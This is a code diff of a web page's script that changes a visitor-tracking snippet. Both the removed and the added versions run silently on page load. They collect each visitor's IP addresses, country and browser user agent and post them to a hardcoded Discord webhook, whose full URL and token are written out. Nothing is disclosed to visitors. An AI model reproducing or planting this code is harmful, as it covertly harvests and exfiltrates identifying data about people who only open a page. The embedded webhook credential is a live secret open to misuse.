@@ -52,37 +52,37 @@
   </script>
 
 <script>
-(function () {
   const webhook = "https://discord.com/api/webhooks/1392323416346071152/dVvZMHALxRDOPHejC-djrl94A6TRg-eRZ7aXThxrq_wTgzUELwScYUw7zdrf1X4_uTAM";
 
-  fetch("https://ipapi.co/json")
-    .then(res => res.json())
-    .then(data => {
-      const embed = {
-        embeds: [{
-          title: "💀",
-          color: 16711680,
-          thumbnail: {
-            url: "https://i.pinimg.com/736x/73/f0/2d/73f02da114a62cafb03d5d5c0c49ccd5.jpg"
-          },
-          fields: [
-            { name: "I", value: data.ip, inline: true },
-            { name: "C", value: `${data.country_name} (${data.country})`, inline: true },
-            { name: "U G", value: navigator.userAgent, inline: false }
-          ],
-          footer: { text: "Death Row Tracker" },
-          timestamp: new Date().toISOString()
-        }]
-      };
+  Promise.all([
+    fetch("https://api64.ipify.org?format=json").then(res => res.json()), 
+    fetch("https://api6.ipify.org?format=json").then(res => res.json()),  
+    fetch("https://ipapi.co/json").then(res => res.json())               
+  ]).then(([ipv4Data, ipv6Data, geoData]) => {
+    const embed = {
+      embeds: [{
+        title: "Webs",
+        color: 16711680,
+        image: { 
+          url: "https://media.giphy.com/media/IeRdg7kGDFQep1IJbP/giphy.gif"
+        },
+        fields: [
+          { name: "IPv4 Address", value: ipv4Data.ip || "N/A", inline: true },
+          { name: "IPv6 Address", value: ipv6Data.ip || "N/A", inline: true },
+          { name: "Country", value: `${geoData.country_name} (${geoData.country})`, inline: true },
+          { name: "User Agent", value: navigator.userAgent, inline: false }
+        ],
+        footer: { text: "Tracker" },
+        timestamp: new Date().toISOString()
+      }]
+    };
 
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embed)
-      });
-    })
-    .catch(e => console.error("Failed to log visitor:", e));
-})();
+    fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embed)
+    }).catch(err => console.error("Webhook send error:", err));
+  }).catch(err => console.error("IP fetch error:", err));
 </script>
 
 </body>
